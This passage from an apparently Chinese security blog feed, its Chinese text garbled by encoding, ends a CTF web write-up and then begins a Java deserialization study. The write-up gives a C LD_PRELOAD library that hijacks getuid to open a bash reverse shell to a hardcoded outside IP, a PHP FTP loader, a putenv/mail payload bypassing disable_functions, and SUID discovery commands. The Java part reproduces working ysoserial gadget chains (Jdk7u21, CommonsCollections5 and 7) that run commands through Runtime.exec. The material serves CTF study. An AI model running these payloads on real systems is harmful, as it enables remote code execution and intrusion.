<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getuid</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>)==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/82.156.2.166/3434 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC exp.c -o exp.so</span><br></pre></td></tr></table></figure>

<h6 id="å¦ä¸€äº›æœ‰ç”¨çŸ¥è¯†"><a href="#å¦ä¸€äº›æœ‰ç”¨çŸ¥è¯†" class="headerlink" title="å¦ä¸€äº›æœ‰ç”¨çŸ¥è¯†"></a>å¦ä¸€äº›æœ‰ç”¨çŸ¥è¯†</h6><p>â€‹    â… . ç”¨pythonæ­å»ºftpæœåŠ¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m pyftpdlib -p 21</span><br></pre></td></tr></table></figure>

<p>â€‹    â…¡. å°†vpsä¸­çš„exp.soå†™è¿›é¶åœºä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$local_file</span> = <span class="string">&quot;/tmp/exp.so&quot;</span>;</span><br><span class="line"><span class="variable">$server_file</span> = <span class="string">&quot;exp.so&quot;</span>;</span><br><span class="line"><span class="variable">$vps</span> = <span class="string">&quot;82.156.2.166&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">21</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ftp</span> = ftp_connect(<span class="variable">$vps</span>,<span class="variable">$port</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = ftp_login(<span class="variable">$ftp</span>, <span class="string">&#x27;anonymous&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ftp_pasv(<span class="variable">$ftp</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ftp_get(<span class="variable">$ftp</span>, <span class="variable">$local_file</span>,<span class="variable">$server_file</span>,FTP_BINARY))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;wrong&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftp_close(<span class="variable">$ftp</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/177fbab174d5473397c10b2f4b6e9351.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ç„¶ååªè¦å°†<code>LD_PRELOAD</code>è®¾ç½®ä¸ºexp.soæ‰€åœ¨çš„ç›®å½•ï¼Œç„¶åæ‰§è¡Œmailå‡½æ•°è§¦å‘getuidå°±å¥½äº†ï¼Œåˆ«å¿˜äº†vpsè¦ç›‘å¬</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">putenv(&quot;LD_PRELOAD=/tmp/exp.so&quot;);mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/59577ef792854b90bb33e5b1697243fa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h6 id="suid-ææƒ"><a href="#suid-ææƒ" class="headerlink" title="suid ææƒ"></a>suid ææƒ</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /bin -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find /usr -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰æƒé™ä½¿ç”¨nl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nl /flag</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://erroratao.github.io/writeup/DASCTF2022xSU/">https://erroratao.github.io/writeup/DASCTF2022xSU/</a></p>
<p><a href="https://amiaaaz.github.io/2022/03/23/smth-about-env-variables/#bypass-disable_functions">https://amiaaaz.github.io/2022/03/23/smth-about-env-variables/#bypass-disable_functions</a></p>
]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>das</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaåˆæ­¥å­¦ä¹ â…¥</title>
    <url>/2022/07/27/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A5/</url>
    <content><![CDATA[<blockquote>
<p>æŒç»­æ›´æ–°ä¸­â€¦â€¦</p>
</blockquote>
<h2 id="Jdk7u21"><a href="#Jdk7u21" class="headerlink" title="Jdk7u21"></a>Jdk7u21</h2><p>ç¯å¢ƒï¼š<code>jdk7u21</code></p>
<p>ä»ysoç»™çš„é“¾åˆ†æï¼Œå…³é”®ä»£ç ï¼š</p>
<p>å…¶ä¸­æ¶‰åŠçš„<code>Gadgets</code> å’Œ<code>Reflections</code> ä¸¤ä¸ªç±»éƒ½æ˜¯ysoé‡Œé¢ç»™çš„ï¼Œåˆ°æ—¶å€™å†åˆ†æ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Yso</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String command = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">        String zeroHashCodeStr = <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">        Reflections.setFieldValue(tempHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">        LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet(); <span class="comment">// maintain order</span></span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_auxClasses&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>); <span class="comment">// ä¸ºäº†å®ç°è°ƒç”¨é“¾</span></span><br><span class="line"></span><br><span class="line">        map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(set);</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bis = <span class="keyword">new</span> ByteArrayInputStream(bos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨<code>javassist</code> ç”Ÿæˆpayloadï¼Œè€Œtemplatesä¸º<code>TemplatesImpl</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">                    command,</span><br><span class="line">                    Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">                    Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">                    Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåˆ©ç”¨åˆ°äº†ä¸€ä¸ªæ–°çš„ç±»<code>LinkedHashSet</code> ï¼Œä¸è¿‡åªæ˜¯<code>HashSet</code>çš„å­ç±»ï¼Œç”¨äºè°ƒç”¨<code>HashSet#readObject</code></p>
<p>åˆ©ç”¨åå°„è·å–æ„é€ æ–¹æ³•å®ä¾‹åŒ–<code>AnnotationInvocationHandler</code> ï¼Œå¹¶ç»™å±æ€§typeèµ‹å€¼</p>
<p>åˆ©ç”¨åŠ¨æ€ä»£ç†çš„æ–¹æ³•å®ç°Templates æ¥å£ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">Reflections.setFieldValue(tempHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);</span><br></pre></td></tr></table></figure>

<p>HashMapä¿®æ”¹å€¼ï¼Œæ˜¯ä¸ºäº†é˜²æ­¢åœ¨åºåˆ—åŒ–çš„æ—¶å€™è§¦å‘ï¼Œå› ä¸ºåºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨åˆ°<code>HashSet#add</code> ä»è€Œè°ƒç”¨åˆ°<code>Hash#put</code> ï¼Œå…¶ä¸­ä¼šè°ƒç”¨åˆ°<code>Templates#equals</code>å› ä¸ºä½¿ç”¨äº†åŠ¨æ€ä»£ç†æ‰€ä»¥ä¼šè°ƒç”¨åˆ°<code>AnnotationInvocationHandler#invoke</code> ä»è€Œè°ƒç”¨åˆ°<code>equalsImpl</code>ï¼Œ</p>
<p><img src="https://img-blog.csdnimg.cn/b20306fa7dec43f4a2954af995590ff7.png" alt="Untitled"></p>
<p>è€Œåœ¨<code>equalsImpl</code> ä¸­ä¼šéå†ç±»é‡Œé¢çš„æ‰€æœ‰æ–¹æ³•ç„¶åç›´æ¥è°ƒç”¨</p>
<p>è°ƒç”¨åˆ°<code>TemplatesImpl#getOutputProperties</code> ä»è€Œå®ç°äº†RCEï¼Œè€Œè¿™ä¸ªä¹Ÿæ˜¯ååºåˆ—åŒ–ä¹‹åå®ç°RCEçš„ä¸»è¦è°ƒç”¨é“¾</p>
<p><img src="https://img-blog.csdnimg.cn/22c2f29e90bd43a1a6fc7ecbb131e8a3.png" alt="Untitled"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">map.put(zeroHashCodeStr, templates);</span><br></pre></td></tr></table></figure>

<p>è€Œååºåˆ—åŒ–ä¹‹ååˆ©ç”¨é“¾çš„èµ·ç‚¹åœ¨äº</p>
<p><img src="https://img-blog.csdnimg.cn/7c5f4542f89149cabc7def638c3bb677.png" alt="Untitled"></p>
<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JDK 8u76</span><br></pre></td></tr></table></figure>

<blockquote>
<p>This only works in JDK 8u76 and WITHOUT a security manager</p>
</blockquote>
<h3 id="Gadget-Chain"><a href="#Gadget-Chain" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections5</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">BadAttributeValueExpException</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> BadAttributeValueExpException <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">      <span class="comment">// inert chain for setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">              <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">      <span class="comment">// real chain for after setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">               String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">               <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">               Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">               <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">               <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">      TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">      BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">      Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        Reflections.setAccessible(valfield);</span><br><span class="line">      valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">      Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> val;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      PayloadRunner.run(CommonsCollections5.class, args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isBadAttrValExcReadObj();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç›¸è¾ƒäºCC6ï¼ŒCC5åˆ©ç”¨åˆ°äº†<code>BadAttributeValueExpException</code> å¼‚å¸¸ç±»ï¼Œå»çœ‹ä¸€ä¸‹è¿™ä¸ªç±»åªæœ‰ä¸€ä¸ªæ„é€ æ–¹æ³•å’Œä¸€ä¸ª<code>toString</code> | <code>readObject</code></p>
<p>è€Œexpä¸­å°†ç»™è¯¥ç±»çš„valèµ‹å€¼ä¸ºæ”¾å…¥äº†ä¿®é¥°å¥½çš„æ¶æ„ç±»çš„<code>TiedMapEntry</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">      Reflections.setAccessible(valfield);</span><br><span class="line">valfield.set(val, entry);</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆå…³é”®å°±æ˜¯ååºåˆ—åŒ–çš„æ—¶å€™ä¼šæ€ä¹ˆè°ƒç”¨ï¼Œå› ä¸ºexpæ˜¯å¯¹<code>val</code> è¿›è¡Œåºåˆ—åŒ–ï¼Œè¯´æ˜ä¼šè°ƒç”¨åˆ°<code>BadAttributeValueExpException</code> çš„<code>readObject</code></p>
<p>ä»£ç æ‰§è¡Œçš„æ—¶å€™ä¼šå®ç°è·å–<code>BadAttributeValueExpException</code> çš„æ‰€æœ‰å±æ€§ï¼Œè€ŒvalObjåˆ™è·å–äº†valçš„å€¼ï¼Œä¹Ÿå°±æ˜¯<code>TiedMapEntry</code> ï¼Œå¯¼è‡´åœ¨åé¢è°ƒç”¨åˆ°äº†<code>valObj.toString()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(<span class="string">&quot;val&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">            val = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>TiedMapEntry#toString</code> ä¼šè°ƒç”¨åˆ°<code>getValue</code>ï¼Œå…¶ä¸­å®ç°å¯¹<code>LazyMap#get</code>çš„è°ƒç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br><span class="line">LazyMap#get` ï¼Œè¿™é‡Œçš„`<span class="keyword">this</span>.factory` å…¶å®å°±æ˜¯`<span class="function">ChainedTransformer</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ChainedTransformer#transform</code> å®ç°payloadä¸­<code>InvokerTransformer#transform</code> çš„è°ƒç”¨ï¼Œä»è€Œå®ç°RCE</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><h3 id="ç¯å¢ƒ-1"><a href="#ç¯å¢ƒ-1" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>jdk8u71</p>
<h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.util.Hashtable.readObject</span><br><span class="line">java.util.Hashtable.reconstitutionPut</span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">java.util.AbstractMap.equals</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">java.lang.Runtime.exec</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections7</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Hashtable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Hashtable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[]&#123;command&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                execArgs),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashtable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(CommonsCollections7.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

